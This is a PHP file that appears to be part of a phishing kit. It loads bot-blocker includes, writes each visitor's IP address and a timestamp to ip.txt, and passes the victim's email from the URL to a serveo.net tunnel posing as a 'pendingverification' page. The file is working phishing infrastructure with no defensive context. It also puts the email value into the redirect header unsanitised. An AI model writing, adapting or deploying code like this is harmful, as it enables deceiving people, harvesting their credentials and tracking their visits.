<?php 
	include('prince.php');
	include ('security/blocker_1.php');
	include ('security/blocker_2.php');
	include ('security/blocker_4.php');
    $ipaddress = '';
    if ($_SERVER['HTTP_CLIENT_IP'])
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if($_SERVER['HTTP_X_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if($_SERVER['HTTP_X_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if($_SERVER['HTTP_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if($_SERVER['HTTP_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if($_SERVER['REMOTE_ADDR'])
        $ipaddress = $_SERVER['REMOTE_ADDR'];
$file = fopen("ip.txt","a");
fwrite($file,$ipaddress."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n"); 


 $site = "https://pendingverification.serveo.net/go";
 $email = $_GET['var'];
  header("Location: ".$site."/index.php?email=".$email."");
  exit;
?>
